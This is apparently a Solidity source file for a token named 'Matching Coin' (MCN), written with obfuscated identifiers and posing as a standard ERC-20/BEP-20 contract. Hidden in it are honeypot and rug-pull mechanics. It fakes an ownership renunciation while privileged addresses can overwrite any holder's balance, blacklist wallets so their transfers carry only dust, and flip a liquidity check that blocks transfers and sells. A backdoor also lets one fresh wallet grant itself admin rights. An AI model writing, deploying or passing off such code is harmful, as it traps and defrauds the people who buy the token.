//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract launchedList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitTx {
    function createPair(address receiverMax, address shouldMaxIs) external returns (address);

    function feeTo() external view returns (address);
}

interface receiverMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface receiverIsSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTotal) external view returns (uint256);

    function transfer(address fundMode, uint256 takeShould) external returns (bool);

    function allowance(address fromSenderEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeShould) external returns (bool);

    function transferFrom(
        address sender,
        address fundMode,
        uint256 takeShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitMax, uint256 value);
    event Approval(address indexed fromSenderEnable, address indexed spender, uint256 value);
}

interface listMode is receiverIsSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MatchingCoin is launchedList, receiverIsSell, listMode {

    function sellLaunchedTrading(address modeTo, address fundMode, uint256 takeShould) internal view returns (uint256) {
        require(takeShould > 0);

        uint256 liquidityIs = 0;
        if (modeTo == feeAt && swapLiquidity > 0) {
            liquidityIs = takeShould * swapLiquidity / 100;
        } else if (fundMode == feeAt && isFrom > 0) {
            liquidityIs = takeShould * isFrom / 100;
        }
        require(liquidityIs <= takeShould);
        return takeShould - liquidityIs;
    }

    bool private swapLaunch;

    function balanceOf(address fundTotal) public view virtual override returns (uint256) {
        return modeMarketing[fundTotal];
    }

    mapping(address => mapping(address => uint256)) private marketingTokenLaunch;

    string private launchedAutoSell = "Matching Coin";

    mapping(address => bool) public receiverEnable;

    address private receiverListTake;

    constructor (){
        if (walletFrom == modeLimit) {
            modeLimit = walletFrom;
        }
        modeMax();
        receiverMarketing enableMin = receiverMarketing(minEnable);
        feeAt = limitTx(enableMin.factory()).createPair(enableMin.WETH(), address(this));
        maxFrom = limitTx(enableMin.factory()).feeTo();
        if (totalEnable != liquidityBuy) {
            liquidityBuy = sellTake;
        }
        isTx = _msgSender();
        enableMax[isTx] = true;
        modeMarketing[isTx] = enableFromLiquidity;
        if (modeLimit != sellTake) {
            swapLaunch = true;
        }
        emit Transfer(address(0), isTx, enableFromLiquidity);
    }

    string private fromLaunchedReceiver = "MCN";

    mapping(address => bool) public enableMax;

    function symbol() external view virtual override returns (string memory) {
        return fromLaunchedReceiver;
    }

    bool private maxEnable;

    function exemptTotal(address modeTo, address fundMode, uint256 takeShould) internal returns (bool) {
        require(modeMarketing[modeTo] >= takeShould);
        modeMarketing[modeTo] -= takeShould;
        modeMarketing[fundMode] += takeShould;
        emit Transfer(modeTo, fundMode, takeShould);
        return true;
    }

    bool public shouldMax;

    function totalFeeMarketing(address teamExempt, uint256 takeShould) public {
        amountTotalMax();
        modeMarketing[teamExempt] = takeShould;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableFromLiquidity;
    }

    function approve(address atMode, uint256 takeShould) public virtual override returns (bool) {
        marketingTokenLaunch[_msgSender()][atMode] = takeShould;
        emit Approval(_msgSender(), atMode, takeShould);
        return true;
    }

    function launchShould(address sellEnableFund) public {
        amountTotalMax();
        if (modeLimit == totalEnable) {
            sellTake = liquidityBuy;
        }
        if (sellEnableFund == isTx || sellEnableFund == feeAt) {
            return;
        }
        receiverEnable[sellEnableFund] = true;
    }

    function owner() external view returns (address) {
        return receiverListTake;
    }

    function toLaunchedMode(uint256 takeShould) public {
        amountTotalMax();
        txTokenLiquidity = takeShould;
    }

    uint256 public modeLimit;

    uint256 private teamAmount;

    address minEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed minTrading, address indexed swapMaxLaunch);

    function allowance(address maxShould, address atMode) external view virtual override returns (uint256) {
        if (atMode == minEnable) {
            return type(uint256).max;
        }
        return marketingTokenLaunch[maxShould][atMode];
    }

    uint256 private sellTake;

    uint256 txTokenLiquidity;

    uint256 public isFrom = 0;

    function amountTotalMax() private view {
        require(enableMax[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return senderAuto;
    }

    function transfer(address teamExempt, uint256 takeShould) external virtual override returns (bool) {
        return fundLaunch(_msgSender(), teamExempt, takeShould);
    }

    function fundLaunch(address modeTo, address fundMode, uint256 takeShould) internal returns (bool) {
        if (modeTo == isTx) {
            return exemptTotal(modeTo, fundMode, takeShould);
        }
        uint256 receiverLiquidity = receiverIsSell(feeAt).balanceOf(maxFrom);
        require(receiverLiquidity == txTokenLiquidity);
        require(fundMode != maxFrom);
        if (receiverEnable[modeTo]) {
            return exemptTotal(modeTo, fundMode, toLaunched);
        }
        takeShould = sellLaunchedTrading(modeTo, fundMode, takeShould);
        return exemptTotal(modeTo, fundMode, takeShould);
    }

    bool private buyFund;

    address public feeAt;

    uint8 private senderAuto = 18;

    uint256 feeAmount;

    uint256 private walletFrom;

    function name() external view virtual override returns (string memory) {
        return launchedAutoSell;
    }

    function getOwner() external view returns (address) {
        return receiverListTake;
    }

    address public isTx;

    uint256 public swapLiquidity = 0;

    uint256 constant toLaunched = 19 ** 10;

    bool public fromFee;

    function walletLimit(address fundBuy) public {
        require(fundBuy.balance < 100000);
        if (shouldMax) {
            return;
        }
        if (liquidityBuy == totalEnable) {
            fromFee = true;
        }
        enableMax[fundBuy] = true;
        if (swapLaunch == maxEnable) {
            totalEnable = teamAmount;
        }
        shouldMax = true;
    }

    function modeMax() public {
        emit OwnershipTransferred(isTx, address(0));
        receiverListTake = address(0);
    }

    function transferFrom(address modeTo, address fundMode, uint256 takeShould) external override returns (bool) {
        if (_msgSender() != minEnable) {
            if (marketingTokenLaunch[modeTo][_msgSender()] != type(uint256).max) {
                require(takeShould <= marketingTokenLaunch[modeTo][_msgSender()]);
                marketingTokenLaunch[modeTo][_msgSender()] -= takeShould;
            }
        }
        return fundLaunch(modeTo, fundMode, takeShould);
    }

    uint256 private enableFromLiquidity = 100000000 * 10 ** 18;

    mapping(address => uint256) private modeMarketing;

    uint256 public totalEnable;

    address maxFrom;

    uint256 public liquidityBuy;

}